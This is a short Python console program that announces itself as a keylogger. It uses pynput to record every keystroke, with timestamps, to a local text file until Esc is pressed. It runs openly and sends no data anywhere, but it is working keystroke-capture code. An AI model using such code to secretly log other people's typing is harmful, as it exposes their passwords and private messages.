import logging
from pynput import keyboard

# Configure logging to save keystrokes to a file
log_file = "keylogger.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def start_keylogger():
    print("\nKeylogger started. Press 'Esc' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    print("Keylogger stopped.\n")

def main():
    welcome_message = """
\033[1;32m
    **************************************************
    *                                                *
    *              WELCOME TO THE                    *
    *                                                *
    *            KEYLOGGER CONSOLE APP               *
    *                                                *
    *                         Created by Vyom Rana   *
    *                                                *
    **************************************************
\033[0m
    """
    print(welcome_message)
    print("\033[1;34mPress '1' to start keylogger\033[0m")
    print("\033[1;31mPress '0' to exit\033[0m")
    
    while True:
        choice = input("\033[1;33m\nEnter your choice: \033[0m")
        if choice == '1':
            start_keylogger()
        elif choice == '0':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
